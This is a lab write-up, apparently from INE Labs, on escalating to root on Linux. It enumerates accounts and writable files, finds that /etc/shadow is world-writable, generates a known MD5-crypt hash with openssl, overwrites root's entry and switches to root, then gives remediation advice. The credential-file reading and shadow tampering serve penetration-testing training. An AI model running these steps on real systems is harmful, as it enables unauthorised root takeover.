---
title: "Linux Privilege Escalation - Weak Permissions"
description: "Escalating to root on Linux by finding a world-writable /etc/shadow: generating a known password hash and overwriting root's entry, then logging in as root."
date: 2025-12-10
platform: "INE Labs"
difficulty: "Medium"
tags: ["Linux", "Privilege Escalation", "Weak Permissions", "/etc/shadow", "find", "openssl"]
cover: "./photo5.png"
---

# Linux Privilege Escalation - Weak Permissions

**Classification:** Host & Network Penetration Testing / Post-Exploitation<br>
**Target:** target (local shell, user `student`)

## 1. Executive Summary

Enumerating world-writable files reveals a critically misconfigured **`/etc/shadow`** (writable
by everyone). We generate a password hash for a known password and overwrite root's entry in
the shadow file, then log in as root.

## 2. Access & Enumeration

![student shell](./photo1.png)

```bash
cat /etc/passwd        # target: root
```

![Accounts on the system](./photo2.png)

```bash
id ; groups
```

![Groups](./photo3.png)

## 3. Finding World-Writable Files

```bash
find / -writable -type f 2>/dev/null
```

![find world-writable files](./photo4.png)

`/etc/shadow` is writable — a serious misconfiguration.

![/etc/shadow is writable](./photo5.png)

![/etc/shadow contents](./photo6.png)

## 4. Overwriting root's Hash

Confirming write access, generating a hash and replacing root's entry.

```bash
ls -l /etc/shadow
openssl passwd -1 -salt abc password123     # generate a MD5-crypt hash
# edit /etc/shadow -> set root's hash to the generated value
```

![Write privileges on /etc/shadow](./photo7.png)

![Generating the hash and writing it](./photo8.png)

![Updated shadow entry](./photo9.png)

## 5. Root

```bash
su root        # password123
id             # uid=0(root)
```

![Root access](./photo10.png)

## 6. Remediation Recommendations

1. **Fix file permissions** — `/etc/shadow` must be `root:shadow` and not writable by others
   (`chmod 640`); audit for world-writable system files (`find / -perm -2 -type f`).
2. **File integrity monitoring** on `/etc/passwd` and `/etc/shadow` with alerting.
3. **Apply least privilege** and review permissions after any provisioning/automation.
